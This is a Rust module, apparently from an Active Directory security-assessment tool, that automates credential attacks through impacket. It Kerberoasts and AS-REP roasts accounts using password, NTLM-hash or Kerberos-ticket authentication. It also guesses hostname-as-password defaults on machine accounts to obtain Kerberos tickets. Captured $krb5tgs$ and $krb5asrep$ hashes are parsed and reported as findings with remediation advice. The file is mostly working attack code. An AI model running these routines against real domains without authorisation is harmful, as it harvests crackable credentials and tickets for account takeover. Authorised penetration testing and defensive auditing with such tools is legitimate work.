use anyhow::Result;
use std::fs;
use std::process::Stdio;
use std::time::Duration;
use tokio::process::Command;
use tokio::time::timeout;

use crate::types::{Finding, ModuleResult, Severity, StageTimer};
use crate::ui;

const TOOL_TIMEOUT_SECS: u64 = 60;
const PRE2K_TIMEOUT_SECS: u64 = 30;

#[derive(Clone, Copy)]
enum HashKind {
    Kerberoast,
    Asrep,
}

/// Run credential attacks using external tools (impacket).
pub async fn run(
    target: &str,
    domain: &str,
    username: &str,
    password: &str,
    ntlm: Option<&str>,
    kerberos: bool,
    output_dir: &str,
    discovered_users: &[String],
) -> Result<ModuleResult> {
    ui::section("CREDENTIAL ATTACKS");
    let timer = StageTimer::start();
    let spin = ui::spinner("CREDS");
    let mut result = ModuleResult::new("credential-attacks");

    if domain.is_empty() {
        ui::finish_spinner_warn(&spin, "domain unresolved");
        result = result.skipped("domain unresolved");
        return Ok(result);
    }

    if !username.is_empty() && !password.is_empty() {
        spin.set_message("kerberoasting with password auth...");
        attempt_kerberoast_password(target, domain, username, password, output_dir, &mut result)
            .await;
    }

    if !username.is_empty() {
        if let Some(hash) = ntlm {
            spin.set_message("kerberoasting with NTLM auth...");
            attempt_kerberoast_ntlm(target, domain, username, hash, output_dir, &mut result).await;
        }

        if kerberos {
            spin.set_message("kerberoasting with Kerberos auth...");
            attempt_kerberoast_kerberos(target, domain, username, output_dir, &mut result).await;
        }
    }

    if !username.is_empty() && !password.is_empty() {
        spin.set_message("as-rep roasting via password auth...");
        attempt_asrep_password(target, domain, username, password, output_dir, &mut result).await;
    }

    if !username.is_empty() {
        if let Some(hash) = ntlm {
            spin.set_message("as-rep roasting via NTLM auth...");
            attempt_asrep_ntlm(target, domain, username, hash, output_dir, &mut result).await;
        }

        if kerberos {
            spin.set_message("as-rep roasting via Kerberos auth...");
            attempt_asrep_kerberos(target, domain, username, output_dir, &mut result).await;
        }
    }

    spin.set_message("as-rep roasting discovered users...");
    attempt_asrep_noauth(target, domain, discovered_users, output_dir, &mut result).await;

    spin.set_message("testing pre2k machine defaults...");
    attempt_pre2k_gettgt(target, domain, discovered_users, output_dir, &mut result).await;

    dedup_users(&mut result.collected_users);

    let finding_count = result.findings.len();
    ui::finish_spinner(&spin, &format!("{} credential attack findings", finding_count));
    ui::stage_done(
        "CRED ATTACKS",
        &format!("{} findings", finding_count),
        &timer.elapsed_pretty(),
    );

    result = result.success(timer.elapsed());
    Ok(result)
}

async fn attempt_kerberoast_password(
    target: &str,
    domain: &str,
    username: &str,
    password: &str,
    output_dir: &str,
    result: &mut ModuleResult,
) {
    let output_file = format!("{}/kerberoast_hashes_password.txt", output_dir);
    let args = vec![
        "-request".to_string(),
        "-dc-ip".to_string(),
        target.to_string(),
        "-outputfile".to_string(),
        output_file.clone(),
        format!("{}/{}:{}", domain, username, password),
    ];

    if let Some((bin, out_text)) = run_getuserspns(&args).await {
        handle_roast_capture(
            result,
            "CRED-001",
            "Kerberoast hashes captured (password auth)",
            "Service account TGS tickets were obtained with password-backed authentication.",
            &bin,
            &output_file,
            &out_text,
            HashKind::Kerberoast,
            Severity::High,
            "Use gMSA, enforce 25+ character passwords on SPN accounts, and rotate impacted service credentials.",
            "T1558.003",
        );
    }
}

async fn attempt_kerberoast_ntlm(
    target: &str,
    domain: &str,
    username: &str,
    ntlm: &str,
    output_dir: &str,
    result: &mut ModuleResult,
) {
    let output_file = format!("{}/kerberoast_hashes_ntlm.txt", output_dir);
    let args = vec![
        "-request".to_string(),
        "-dc-ip".to_string(),
        target.to_string(),
        "-outputfile".to_string(),
        output_file.clone(),
        format!("{}/{}:", domain, username),
        "-hashes".to_string(),
        normalize_ntlm_hash(ntlm),
    ];

    if let Some((bin, out_text)) = run_getuserspns(&args).await {
        handle_roast_capture(
            result,
            "CRED-002",
            "Kerberoast hashes captured (NTLM auth)",
            "Service account TGS tickets were obtained using NTLM-backed authentication.",
            &bin,
            &output_file,
            &out_text,
            HashKind::Kerberoast,
            Severity::High,
            "Rotate impacted service account credentials and review NTLM exposure in the environment.",
            "T1558.003",
        );
    }
}

async fn attempt_kerberoast_kerberos(
    target: &str,
    domain: &str,
    username: &str,
    output_dir: &str,
    result: &mut ModuleResult,
) {
    let output_file = format!("{}/kerberoast_hashes_kerberos.txt", output_dir);
    let args = vec![
        "-request".to_string(),
        "-dc-ip".to_string(),
        target.to_string(),
        "-outputfile".to_string(),
        output_file.clone(),
        "-k".to_string(),
        "-no-pass".to_string(),
        format!("{}/{}", domain, username),
    ];

    if let Some((bin, out_text)) = run_getuserspns(&args).await {
        handle_roast_capture(
            result,
            "CRED-003",
            "Kerberoast hashes captured (Kerberos auth)",
            "Service account TGS tickets were obtained using a Kerberos ticket cache.",
            &bin,
            &output_file,
            &out_text,
            HashKind::Kerberoast,
            Severity::High,
            "Rotate impacted service account credentials and review delegation and ticket-handling controls.",
            "T1558.003",
        );
    }
}

async fn attempt_asrep_password(
    target: &str,
    domain: &str,
    username: &str,
    password: &str,
    output_dir: &str,
    result: &mut ModuleResult,
) {
    let output_file = format!("{}/asreproast_hashes_password.txt", output_dir);
    let args = vec![
        format!("{}/{}:{}", domain, username, password),
        "-request".to_string(),
        "-dc-ip".to_string(),
        target.to_string(),
        "-format".to_string(),
        "hashcat".to_string(),
        "-outputfile".to_string(),
        output_file.clone(),
    ];

    if let Some((bin, out_text)) = run_getnpusers(&args).await {
        handle_roast_capture(
            result,
            "CRED-004",
            "AS-REP roast hashes captured (password auth)",
            "GetNPUsers retrieved AS-REP roastable user material using password-backed authentication.",
            &bin,
            &output_file,
            &out_text,
            HashKind::Asrep,
            Severity::High,
            "Enable Kerberos pre-authentication for impacted users and rotate compromised credentials.",
            "T1558.004",
        );
    }
}

async fn attempt_asrep_ntlm(
    target: &str,
    domain: &str,
    username: &str,
    ntlm: &str,
    output_dir: &str,
    result: &mut ModuleResult,
) {
    let output_file = format!("{}/asreproast_hashes_ntlm.txt", output_dir);
    let args = vec![
        format!("{}/{}", domain, username),
        "-hashes".to_string(),
        normalize_ntlm_hash(ntlm),
        "-request".to_string(),
        "-dc-ip".to_string(),
        target.to_string(),
        "-format".to_string(),
        "hashcat".to_string(),
        "-outputfile".to_string(),
        output_file.clone(),
    ];

    if let Some((bin, out_text)) = run_getnpusers(&args).await {
        handle_roast_capture(
            result,
            "CRED-005",
            "AS-REP roast hashes captured (NTLM auth)",
            "GetNPUsers retrieved AS-REP roastable user material using NTLM-backed authentication.",
            &bin,
            &output_file,
            &out_text,
            HashKind::Asrep,
            Severity::High,
            "Enable Kerberos pre-authentication for impacted users and reduce NTLM exposure.",
            "T1558.004",
        );
    }
}

async fn attempt_asrep_kerberos(
    target: &str,
    domain: &str,
    username: &str,
    output_dir: &str,
    result: &mut ModuleResult,
) {
    let output_file = format!("{}/asreproast_hashes_kerberos.txt", output_dir);
    let args = vec![
        format!("{}/{}", domain, username),
        "-k".to_string(),
        "-no-pass".to_string(),
        "-request".to_string(),
        "-dc-ip".to_string(),
        target.to_string(),
        "-format".to_string(),
        "hashcat".to_string(),
        "-outputfile".to_string(),
        output_file.clone(),
    ];

    if let Some((bin, out_text)) = run_getnpusers(&args).await {
        handle_roast_capture(
            result,
            "CRED-006",
            "AS-REP roast hashes captured (Kerberos auth)",
            "GetNPUsers retrieved AS-REP roastable user material using a Kerberos ticket cache.",
            &bin,
            &output_file,
            &out_text,
            HashKind::Asrep,
            Severity::High,
            "Enable Kerberos pre-authentication for impacted users and review Kerberos ticket handling.",
            "T1558.004",
        );
    }
}

async fn attempt_asrep_noauth(
    target: &str,
    domain: &str,
    discovered_users: &[String],
    output_dir: &str,
    result: &mut ModuleResult,
) {
    let users = build_asrep_user_list(discovered_users);
    if users.is_empty() {
        return;
    }

    let users_file = format!("{}/aydee_users_asrep.txt", output_dir);
    if tokio::fs::write(&users_file, users.join("\n")).await.is_err() {
        return;
    }

    let output_file = format!("{}/asreproast_hashes_discovered_users.txt", output_dir);
    let args = vec![
        format!("{}/", domain),
        "-dc-ip".to_string(),
        target.to_string(),
        "-usersfile".to_string(),
        users_file,
        "-format".to_string(),
        "hashcat".to_string(),
        "-outputfile".to_string(),
        output_file.clone(),
        "-no-pass".to_string(),
    ];

    if let Some((bin, out_text)) = run_getnpusers(&args).await {
        handle_roast_capture(
            result,
            "CRED-007",
            "AS-REP roast hashes captured from discovered users",
            "GetNPUsers recovered AS-REP roastable user hashes without needing valid credentials.",
            &bin,
            &output_file,
            &out_text,
            HashKind::Asrep,
            Severity::High,
            "Enable Kerberos pre-authentication for impacted users and rotate compromised credentials.",
            "T1558.004",
        );
    }
}

async fn attempt_pre2k_gettgt(
    target: &str,
    domain: &str,
    discovered_users: &[String],
    output_dir: &str,
    result: &mut ModuleResult,
) {
    let machines = build_machine_candidates(discovered_users);
    if machines.is_empty() {
        ui::info("No machine-account candidates available for pre2k/default-password checks");
        return;
    }

    ui::info(&format!(
        "Testing {} machine-account candidate(s) for pre2k/default passwords",
        machines.len()
    ));

    let mut successes = Vec::new();
    for machine_account in machines.iter().take(64) {
        let machine = machine_account.trim_end_matches('$');
        if machine.is_empty() {
            continue;
        }

        let guess = machine.to_ascii_lowercase();
        let principal = format!("{}/{}$:{}", domain, machine, guess);

        if run_gettgt(target, &principal, output_dir).await {
            let saved_ticket = locate_ccache(output_dir, machine_account)
                .unwrap_or_else(|| format!("{}/{}.ccache", output_dir, machine_account));
            ui::success(&format!("Pre2k/default machine password worked for {}", machine_account));
            ui::kv("Ticket", &saved_ticket);
            successes.push(format!("{} / {} / {}", machine_account, guess, saved_ticket));
            result.collected_users.push(machine_account.to_string());
        }
    }

    if !successes.is_empty() {
        let finding = Finding::new(
            "credential",
            "CRED-008",
            Severity::Critical,
            "Pre2k/default machine-account authentication succeeded",
        )
        .with_description(
            "Machine accounts accepted the lowercase hostname-as-password default and yielded Kerberos tickets.",
        )
        .with_evidence(&successes.join("\n"))
        .with_recommendation(
            "Immediately reset affected machine-account passwords and disable stale pre-created computer accounts.",
        )
        .with_mitre("T1558.001");
        result.findings.push(finding);
    } else {
        ui::info("No pre2k/default machine-account passwords succeeded");
    }
}

async fn run_getuserspns(args: &[String]) -> Option<(String, String)> {
    run_tool_candidates(&["GetUserSPNs.py", "impacket-GetUserSPNs"], args).await
}

async fn run_getnpusers(args: &[String]) -> Option<(String, String)> {
    run_tool_candidates(&["GetNPUsers.py", "impacket-GetNPUsers"], args).await
}

async fn run_tool_candidates(bins: &[&str], args: &[String]) -> Option<(String, String)> {
    for bin in bins {
        let mut cmd = Command::new(bin);
        cmd.args(args).stdin(Stdio::null());
        match timeout(Duration::from_secs(TOOL_TIMEOUT_SECS), cmd.output()).await {
            Err(_) => {
                ui::warning(&format!(
                    "{} timed out after {}s (skipping method)",
                    bin, TOOL_TIMEOUT_SECS
                ));
            }
            Ok(Err(_)) => continue,
            Ok(Ok(out)) if out.status.success() => {
                let mut text = String::new();
                text.push_str(&String::from_utf8_lossy(&out.stdout));
                text.push('\n');
                text.push_str(&String::from_utf8_lossy(&out.stderr));
                ui::verbose_output(bin, &text);
                return Some((bin.to_string(), text));
            }
            Ok(Ok(out)) => {
                ui::verbose_output(bin, &String::from_utf8_lossy(&out.stdout));
                ui::verbose_output(bin, &String::from_utf8_lossy(&out.stderr));
            }
        }
    }
    None
}

async fn run_gettgt(target: &str, principal: &str, output_dir: &str) -> bool {
    for bin in ["getTGT.py", "impacket-getTGT"] {
        let mut cmd = Command::new(bin);
        cmd.arg("-dc-ip")
            .arg(target)
            .arg(principal)
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .stdin(Stdio::null())
            .current_dir(output_dir);

        if let Ok(Ok(out)) = timeout(Duration::from_secs(PRE2K_TIMEOUT_SECS), cmd.output()).await {
            if out.status.success() {
                return true;
            }
        }
    }
    false
}

#[allow(clippy::too_many_arguments)]
fn handle_roast_capture(
    result: &mut ModuleResult,
    finding_id: &str,
    title: &str,
    description: &str,
    backend: &str,
    output_file: &str,
    output_text: &str,
    kind: HashKind,
    severity: Severity,
    recommendation: &str,
    mitre: &str,
) {
    let hashes = read_hash_lines(output_file)
        .filter(|lines| !lines.is_empty())
        .unwrap_or_else(|| hash_lines_from_text(output_text, kind));
    if hashes.is_empty() {
        ui::info(&format!("{} completed: no roastable material returned", backend));
        return;
    }

    let users = read_hash_users(output_file, kind).unwrap_or_else(|| parse_hash_users(output_text, kind));
    if !users.is_empty() {
        result.collected_users.extend(users.clone());
    }

    let preview = display_limited(&hashes, 10);
    let impacted = if users.is_empty() {
        "<could not parse usernames>".to_string()
    } else {
        display_limited(&users, 10)
    };

    ui::success(&format!("{} captured roast data", backend));
    ui::kv("Output", output_file);
    ui::kv("Users", &impacted);
    ui::kv("Preview", &preview);

    let finding = Finding::new("credential", finding_id, severity, title)
        .with_description(description)
        .with_evidence(&format!(
            "Backend: {}\nOutput: {}\nUsers: {}\n{}",
            backend, output_file, impacted, preview
        ))
        .with_recommendation(recommendation)
        .with_mitre(mitre);
    result.findings.push(finding);
}

fn build_asrep_user_list(discovered_users: &[String]) -> Vec<String> {
    let mut users = discovered_users
        .iter()
        .map(|u| normalize_user(u))
        .filter(|u| !u.is_empty())
        .take(5000)
        .collect::<Vec<_>>();
    dedup_users(&mut users);
    users
}

fn build_machine_candidates(discovered_users: &[String]) -> Vec<String> {
    let mut machines = discovered_users
        .iter()
        .map(|u| u.trim().to_string())
        .filter(|u| u.ends_with('$'))
        .collect::<Vec<_>>();
    dedup_users(&mut machines);
    machines
}

fn normalize_user(user: &str) -> String {
    user.trim()
        .trim_end_matches('$')
        .split('@')
        .next()
        .unwrap_or(user)
        .rsplit('\\')
        .next()
        .unwrap_or(user)
        .trim()
        .to_string()
}

fn normalize_ntlm_hash(ntlm: &str) -> String {
    if ntlm.contains(':') {
        ntlm.to_string()
    } else {
        format!("aad3b435b51404eeaad3b435b51404ee:{}", ntlm)
    }
}

fn dedup_users(users: &mut Vec<String>) {
    users.sort_by_key(|u| u.to_ascii_lowercase());
    users.dedup_by(|a, b| a.eq_ignore_ascii_case(b));
}

fn read_hash_lines(path: &str) -> Option<Vec<String>> {
    let content = fs::read_to_string(path).ok()?;
    let lines = content
        .lines()
        .map(str::trim)
        .filter(|line| !line.is_empty())
        .map(ToOwned::to_owned)
        .collect::<Vec<_>>();
    if lines.is_empty() {
        None
    } else {
        Some(lines)
    }
}

fn read_hash_users(path: &str, kind: HashKind) -> Option<Vec<String>> {
    let lines = read_hash_lines(path)?;
    let mut users = lines
        .iter()
        .filter_map(|line| parse_hash_user(line, kind))
        .collect::<Vec<_>>();
    if users.is_empty() {
        None
    } else {
        dedup_users(&mut users);
        Some(users)
    }
}

fn parse_hash_users(text: &str, kind: HashKind) -> Vec<String> {
    let mut users = text
        .lines()
        .filter_map(|line| parse_hash_user(line.trim(), kind))
        .collect::<Vec<_>>();
    dedup_users(&mut users);
    users
}

fn hash_lines_from_text(text: &str, kind: HashKind) -> Vec<String> {
    let marker = match kind {
        HashKind::Kerberoast => "$krb5tgs$",
        HashKind::Asrep => "$krb5asrep$",
    };

    text.lines()
        .map(str::trim)
        .filter(|line| line.contains(marker))
        .map(ToOwned::to_owned)
        .collect()
}

fn parse_hash_user(line: &str, kind: HashKind) -> Option<String> {
    match kind {
        HashKind::Kerberoast => parse_kerberoast_user(line),
        HashKind::Asrep => parse_asrep_user(line),
    }
}

fn parse_kerberoast_user(line: &str) -> Option<String> {
    if !line.contains("$krb5tgs$") {
        return None;
    }

    let after = line.split("$krb5tgs$").nth(1)?;
    let parts = after.split('$').collect::<Vec<_>>();
    if parts.len() >= 2 {
        return Some(parts[1].trim_start_matches('*').to_string());
    }

    None
}

fn parse_asrep_user(line: &str) -> Option<String> {
    if !line.contains("$krb5asrep$") {
        return None;
    }

    let after = line.split("$krb5asrep$").nth(1)?;
    let parts = after.splitn(2, '$').collect::<Vec<_>>();
    if parts.len() >= 2 {
        return Some(parts[1].split('@').next()?.to_string());
    }

    None
}

fn display_limited(items: &[String], limit: usize) -> String {
    if items.is_empty() {
        return String::new();
    }
    if items.len() <= limit {
        return items.join(" | ");
    }

    let mut output = items[..limit].join(" | ");
    output.push_str(" | <snip>");
    output
}

fn locate_ccache(output_dir: &str, principal: &str) -> Option<String> {
    let principal = principal.trim_end_matches('$').to_ascii_lowercase();
    let entries = fs::read_dir(output_dir).ok()?;

    for entry in entries.flatten() {
        let path = entry.path();
        let is_ccache = path
            .extension()
            .and_then(|ext| ext.to_str())
            .is_some_and(|ext| ext.eq_ignore_ascii_case("ccache"));
        if !is_ccache {
            continue;
        }

        let file_name = path.file_name()?.to_str()?.to_ascii_lowercase();
        if file_name.contains(&principal) {
            return Some(path.display().to_string());
        }
    }

    None
}
